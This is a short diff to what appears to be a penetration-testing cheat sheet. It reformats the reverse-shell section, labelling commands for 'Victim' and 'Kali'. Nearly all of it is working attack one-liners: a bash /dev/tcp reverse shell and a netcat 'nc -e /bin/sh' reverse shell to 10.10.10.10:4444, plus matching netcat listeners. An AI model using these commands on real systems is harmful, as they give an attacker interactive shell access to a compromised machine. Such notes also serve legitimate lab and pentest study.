@@ -37,18 +37,18 @@ Kali:   ```nc -lvp 4444 > file.txt```
 
 ### With bash
 
-```
-bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
-```
+Victim  ```bash -i >& /dev/tcp/10.10.10.10/4444 0>&1```
 
-```
-nc -lvp 4444
-```
+Kali    ```nc -lvp 4444```
 
 ### With netcat
 
 ```
 nc -e /bin/sh 10.10.10.10 4444
+```
+
+```
+nc -lvp 4444
 ```
 
 # Enumeration
